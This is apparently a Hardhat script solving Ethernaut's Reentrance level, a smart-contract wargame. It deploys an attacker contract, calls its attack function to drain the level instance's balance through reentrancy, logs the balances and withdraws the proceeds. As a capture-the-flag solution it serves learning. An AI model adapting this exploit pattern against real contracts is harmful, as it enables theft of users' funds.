import { ethers } from "hardhat";
import { ETHERNAUT_ABI, ETHERNAUT_ADDRESS } from "./constants";

const INSTANCE_ADDRESS = "0x65cC5C58135c4Cd820cca7C5Ab70b523c55E8e72";
const solutionAddress = "0xDa408B18e3A0662f2aBdcEC4B84B7b3d7F9A8FAe";

async function main() {
  const [me] = await ethers.getSigners();
  // Hardhat always runs the compile task when running scripts with its command
  // line interface.
  //
  // If this script is run directly using `node` you may want to call compile
  // manually to make sure everything is compiled
  // await hre.run('compile');

  // We get the contract to deploy
  const ethernaut = await ethers.getContractAt(
    ETHERNAUT_ABI,
    ETHERNAUT_ADDRESS
  );

  const Contract = await ethers.getContractFactory("Reentrance");
  const contract = await Contract.attach(INSTANCE_ADDRESS);

  await contract.deployed();

  // with contract - does not pass level though as the new owner address is different
  const Solution = await ethers.getContractFactory("Level10Solution");
  const solution = await Solution.deploy(contract.address);
  await solution.deployed();

  console.log(
    "Starting balance: ",
    await ethers.provider.getBalance(contract.address)
  );

  const donation = ethers.utils.parseEther("0.0001");

  await solution.connect(me).attack({
    value: donation,
  });

  console.log(
    "Ending balance: ",
    await ethers.provider.getBalance(contract.address)
  );

  console.log(
    "Solution balance: ",
    await ethers.provider.getBalance(solution.address)
  );

  await solution.withdraw();

  /**
   * Uncomment the below to automatically submit the level instance, you will have to refresh the ethernaut page and will not see the pretty level completed message.
   * I suggest submittin the instance on the ethernaut website.
   * I only did this for my own personal satisfaction
   */
  // submit level instance
  // const tx = await ethernaut.submitLevelInstance(INSTANCE_ADDRESS);
  // const rc = await tx.wait();
  // console.log(rc);
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
